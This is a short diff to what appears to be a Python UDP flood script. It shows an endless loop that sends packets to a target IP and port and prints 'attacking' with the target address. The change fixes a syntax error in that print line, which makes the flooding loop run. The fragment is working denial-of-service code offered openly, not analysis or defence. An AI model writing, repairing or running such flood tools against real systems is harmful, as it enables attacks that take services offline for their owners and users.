@@ -49,4 +49,4 @@ print(" ")
 print("===================================================================")
 while True:
      sock.sendto(bytes, (ip1,port1))
-     print("attacking ", ip1, ":", port1")
+     print("attacking ", ip1, ":", port1)
